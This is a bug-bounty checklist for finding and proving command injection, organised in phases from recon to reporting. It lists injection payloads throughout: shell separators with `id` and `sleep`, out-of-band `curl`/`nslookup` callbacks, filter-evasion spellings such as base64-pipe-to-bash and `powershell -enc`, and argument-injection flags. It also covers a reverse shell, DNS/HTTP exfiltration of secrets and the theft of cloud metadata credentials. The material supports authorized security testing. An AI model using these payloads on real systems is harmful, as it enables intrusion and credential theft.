# Command-Injection Testing Checklist — tick per sink

> Companion to `COMMAND_INJECTION_TESTING_GUIDE.md`. The finding is **a command executing** (output / repeated delay /
> server-sourced OOB), not a reflected metacharacter. Work top-to-bottom **per command sink**; stop and report only
> when execution is proven.

## PHASE 0 — Recon & lab (§3/§1)
*Why this matters:* you can only find command injection where the app actually talks to a shell — so the win is enumerating *every* such feature, including the non-obvious ones (an image resize, a PDF export, a git clone, a filename passed to a converter). And because most command injection is **blind**, standing up an OOB listener *first* isn't optional — without it you literally cannot see the majority of hits.
- [ ] Found every feature that shells out (ping/lookup/whois, convert/resize/transcode, tar/zip, git, backup, diagnostics).
- [ ] Checked filenames/headers/EXIF/metadata consumed by a shell-out; grepped source/JS for exec/system/spawn.
- [ ] **Second-order:** flagged stored values (hostname/path/name in profile/config) later consumed by a backend job/cron.
- [ ] Stood up an **OOB host** (interactsh) for blind detection + exfil.

## PHASE 1 — Baseline / classify (§4/§6.1)
*Why this matters:* the same target needs completely different payloads depending on two things you establish here — **how you'll observe a hit** (in-band vs time vs OOB) and **the OS/quote-context** your input lands in. Skip this and you'll throw Linux in-band payloads at a blind Windows sink and wrongly conclude "not vulnerable." Two minutes of classification decides which of the next sections even applies.
- [ ] Injected benign markers; classified **in-band / time / OOB**; identified **OS/shell** (`&ver`/`&echo %OS%` vs `;uname`).
- [ ] Determined where input LANDS: full-command vs **argument-only** vs **quoted** (sent `'` and `"` separately to find the quote).
- [ ] Picked the matching **breakout** (unquoted `;id` / double `";id;"` / single `';id;'` / inside `` ` `` or `$()` / newline `%0a`).

## PHASE 2 — Detect (§5–§9)
*Why this matters:* this is the phase that turns "suspicious feature" into "proven execution." Work the observability ladder in order — in-band (easiest) → time → OOB → boolean — because each rung catches sinks the previous one can't see, and the lower rungs (time/OOB/boolean) are exactly where the *blind* majority of real command injection is confirmed. Don't forget the argument-injection branch when your input is a lone argument (no separator will ever work there).
- [ ] In-band: tried `;` `|` `||` `&` `&&` `` `id` `` `$(id)` newline → looked for `id`/marker output.
- [ ] **Windows:** tried `&`/`|`/`||` with `whoami`/`ver`/`echo %OS%` (Linux payloads silent ≠ safe — it may be Windows).
- [ ] Time-based: `;sleep 10` (Win `& ping -n 10 127.0.0.1`/`& timeout 10`) → **repeated** delay vs baseline (excluded jitter).
- [ ] OOB: `;nslookup x.oob` / `;curl http://oob` (Win `& nslookup %COMPUTERNAME%.oob`) → hit **from the server IP**.
- [ ] Boolean/response-diff blind (§7.1, when time noisy + OOB blocked): `;true` vs `;false` / valid-vs-invalid command / `[ … ] && <observable>` → stable success-vs-fail signal → read 1 char/req.
- [ ] Argument injection (if input is one arg): tried tool flags (`curl -o`, `tar --checkpoint-action=exec=`, `git ext::sh`).

## PHASE 3 — Evade WAF/filter (§10)
*Why this matters:* a blocked payload is **not** a safe target — it's a filtered one, and filtered command injection is still Critical the moment you route around the block. Since the shell accepts many spellings of the same command, a WAF that bans a character or word rarely bans *all* the equivalents. Re-spell (`${IFS}`, `c''at`, base64-pipe, globbing) one layer at a time before you ever write it off.
- [ ] Spaces blocked → `${IFS}` / `{cmd,arg}` / `<` (Linux); `%09`/`,`/`;` token-splitting (Windows).
- [ ] Keyword blocked → quoting/backslash (`c''at`, `w\ho\am\i`) / globbing (`/???/c?t`); Windows `^`/`""` (`w^h^o^a^m^i`, `who""ami`).
- [ ] Heavy filter → base64-decode-pipe (`echo <b64>|base64 -d|bash`); Windows `powershell -enc <base64-UTF16LE>`.
- [ ] Windows keyword rebuild → env-var substring (`%COMSPEC:~-7,3%`) / `FOR /F` loops / delayed expansion (`cmd /v:on`).
- [ ] Separator blocked → swap (`|`, `||`, `` ` ``, `$()`, `%0a`).

## PHASE 4 — Impact (§11–§14)
*Why this matters:* command injection is already the top-severity web bug, so "impact" here is mostly about *proving* it cleanly and safely — a single `id`/`whoami` (or an OOB callback carrying `$(whoami)`) is a complete Critical. The restraint is the point: reading customer data, planting a shell, or pivoting destructively adds legal/operational risk without adding bounty. Prove it with a benign marker and stop; anything deeper is red-team-only and must be cleaned up.
- [ ] **Shell (§11):** confirmed `id`/`whoami`; (authorized red-team) reverse shell to my listener.
- [ ] **Blind exfil (§12):** sent `$(whoami)`/`$(hostname)`/secret(base64) through DNS/HTTP OOB.
- [ ] **Pivot (§13, authorized):** read config/.env → creds (read-only); cloud metadata creds from the box.
- [ ] **Special sinks (§14):** ImageMagick MVG/SVG, ffmpeg playlist, Ghostscript, git/tar (+ FileUpload kit to land the file).
- [ ] **Cleaned up:** removed any written files; killed shells; no persistence.

## PHASE 5 — Validate → report
*Why this matters:* the fastest way to get a Critical closed is to report a *reflected character* or a *single jittery slow response* as "command injection." This phase is your gate against that embarrassment: prove a command actually ran (output / repeated delay / server-sourced OOB with your marker), exclude jitter, tie the callback to your exact payload + the target IP, and lead the report with the impact (RCE) plus CWE-78/88. Clean, reproducible proof is what makes it pay.
- [ ] Proved **execution** (output / repeated delay / server-sourced OOB carrying a marker) — FP check §16.
- [ ] Re-tested timing 2–3× to exclude jitter; tied the OOB hit to my specific payload + server IP.
- [ ] Used a **benign marker**; validated read secrets read-only; redacted.
- [ ] Confirmed on **production**; re-tested partial fixes (`;`→`|`/`$()`, space→`${IFS}`).
- [ ] Set CVSS 3.1 + **CWE-78** (or **CWE-88** for argument injection) (§17).
- [ ] De-duped to one finding per sink; led with the cleanest execution proof (§20).

## AUTO-REJECT (don't submit if…)
- [ ] A `;`/`|` merely **reflected** in the response (no command ran).
- [ ] A **single** slow response after `;sleep` (could be jitter — re-test).
- [ ] An "invalid host" error (validation, not execution).
- [ ] An OOB hit you can't tie to your payload + the **target** server IP.
- [ ] SSRF mislabeled (server fetched a URL, no command ran).
- [ ] "commix flagged it" with no manual reproduction.
- [ ] Self-DoS (`;sleep 999` / fork bomb) instead of a benign marker.
